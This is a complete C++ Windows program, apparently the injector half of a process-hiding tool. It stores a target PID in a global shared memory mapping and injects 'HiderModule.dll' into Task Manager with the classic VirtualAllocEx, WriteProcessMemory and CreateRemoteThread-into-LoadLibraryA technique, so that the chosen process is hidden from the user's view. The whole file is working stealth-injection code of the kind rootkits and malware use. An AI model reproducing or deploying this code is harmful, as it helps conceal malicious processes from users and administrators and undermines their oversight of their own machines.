#undef UNICODE

#include <iostream>
#include <string>
#include <exception>
#include <windows.h>
#include <tlhelp32.h>

static const std::string TASKMGR_IMAGE = "Taskmgr.exe";
static const std::string HIDER_IMAGE = "HiderModule.dll";

static const std::string PID_MAPPING_NAME = "Global\\HiddenPIDMapping";

HANDLE get_process_handle(const std::string& image)
{
	auto snapshot_handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot_handle == INVALID_HANDLE_VALUE)
	{
		return nullptr;
	}

	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);

	if (!::Process32First(snapshot_handle, &entry))
	{
		::CloseHandle(snapshot_handle);
		return nullptr;
	}

	auto process_handle = static_cast<HANDLE>(nullptr);

	do
	{
		if (image != entry.szExeFile)
		{
			continue;
		}

		process_handle = ::OpenProcess(PROCESS_ALL_ACCESS, false, entry.th32ProcessID);
		break;
	} while (::Process32Next(snapshot_handle, &entry));

	::CloseHandle(snapshot_handle);
	return process_handle;
}

HANDLE map_hidden_pid_globally(int hidden_pid)
{
	auto mapping_handle = ::CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		nullptr,
		PAGE_READWRITE,
		0,
		sizeof(hidden_pid),
		PID_MAPPING_NAME.c_str()
	);
	if (!mapping_handle)
	{
		return nullptr;
	}

	auto p_hidden_pid = reinterpret_cast<int*>(::MapViewOfFile(
		mapping_handle,
		FILE_MAP_WRITE,
		0,
		0,
		sizeof(hidden_pid)
	));
	if (!p_hidden_pid)
	{
		::CloseHandle(mapping_handle);
		return nullptr;
	}

	*p_hidden_pid = hidden_pid;

	::UnmapViewOfFile(p_hidden_pid);

	return mapping_handle;
}

std::string get_absolute_path(const std::string& relative_path)
{
	std::string absolute_path;
	absolute_path.resize(MAX_PATH, '\0');

	::GetFullPathNameA(
		relative_path.c_str(),
		absolute_path.size(),
		const_cast<char*>(absolute_path.c_str()),
		nullptr
	);

	return absolute_path;
}

bool inject_module(HANDLE process_handle, const std::string& module_image)
{
	auto module_image_addr = ::VirtualAllocEx(
		process_handle,
		nullptr,
		module_image.size() + 1,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);
	if (!module_image_addr)
	{
		return false;
	}

	size_t bytes{};
	auto success = ::WriteProcessMemory(
		process_handle,
		module_image_addr,
		module_image.c_str(),
		module_image.size(),
		&bytes
	);
	if (!success || bytes != module_image.size())
	{
		::VirtualFreeEx(
			process_handle,
			module_image_addr,
			0,
			MEM_RELEASE
		);

		return false;
	}

	auto thread_handle = ::CreateRemoteThread(
		process_handle,
		nullptr,
		0,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA),
		module_image_addr,
		0,
		nullptr
	);
	if (!thread_handle)
	{
		::VirtualFreeEx(
			process_handle,
			module_image_addr,
			0,
			MEM_RELEASE
		);

		return false;
	}

	::WaitForSingleObject(
		thread_handle,
		INFINITE
	);

	::VirtualFreeEx(
		process_handle,
		module_image_addr,
		0,
		MEM_RELEASE
	);

	::CloseHandle(thread_handle);

	return true;
}

int main(int argc, char* argv[])
{
	if (argc < 2)
	{
		std::cout << "[-] usage: " << argv[0] << " pid" << std::endl;
		return 1;
	}

	auto hidden_pid = std::stol(argv[1]);

	auto taskmgr_handle = get_process_handle(TASKMGR_IMAGE);
	if (!taskmgr_handle)
	{
		std::cout << "[-] could not obtain a handle to the task manager process." << std::endl;
		return 1;
	}

	auto mapping_handle = map_hidden_pid_globally(hidden_pid);
	if (!mapping_handle)
	{
		std::cout << "[-] could not map the hidden pid globally." << std::endl;
		return 1;
	}

	auto success = inject_module(taskmgr_handle, get_absolute_path(HIDER_IMAGE));
	if (success)
	{
		std::cout << "[+] successfully injected the hider module into the task manager process." << std::endl;
	}
	else
	{
		std::cout << "[-] could not inject the hider module into the task manager process." << std::endl;
	}

	::CloseHandle(mapping_handle);
	::CloseHandle(taskmgr_handle);

	return 0;
}
